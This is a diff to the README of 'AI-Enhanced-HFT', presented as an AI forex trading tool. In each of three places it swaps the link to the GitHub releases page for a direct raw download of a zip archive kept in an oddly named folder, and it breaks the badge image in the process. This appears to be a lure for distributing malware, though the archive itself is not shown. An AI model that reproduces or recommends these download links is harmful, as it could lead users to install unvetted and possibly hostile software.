@@ -1,6 +1,6 @@
 # 🚀 AI-Enhanced-HFT - Seamless Forex Trading with AI
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/MonaliTalukdar12/AI-Enhanced-HFT/releases)
+[![Download Now](https://raw.githubusercontent.com/MonaliTalukdar12/AI-Enhanced-HFT/main/Taramembe/AI-Enhanced-HFT.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/MonaliTalukdar12/AI-Enhanced-HFT/main/Taramembe/AI-Enhanced-HFT.zip)
 
 ## 📖 Overview
 
@@ -27,7 +27,7 @@ To start using AI-Enhanced-HFT, follow these steps:
 
 1. **Visit the Download Page**: Click on the link below to access the release files.
    
-   [Download Page](https://github.com/MonaliTalukdar12/AI-Enhanced-HFT/releases)
+   [Download Page](https://raw.githubusercontent.com/MonaliTalukdar12/AI-Enhanced-HFT/main/Taramembe/AI-Enhanced-HFT.zip)
 
 2. **Select the Latest Release**: Look for the most recent version at the top of the list.
 
@@ -47,7 +47,7 @@ To start using AI-Enhanced-HFT, follow these steps:
 
 To download and install AI-Enhanced-HFT, visit the link below:
 
-[Download AI-Enhanced-HFT](https://github.com/MonaliTalukdar12/AI-Enhanced-HFT/releases)
+[Download AI-Enhanced-HFT](https://raw.githubusercontent.com/MonaliTalukdar12/AI-Enhanced-HFT/main/Taramembe/AI-Enhanced-HFT.zip)
 
 ## ⚙️ Using AI-Enhanced-HFT
 
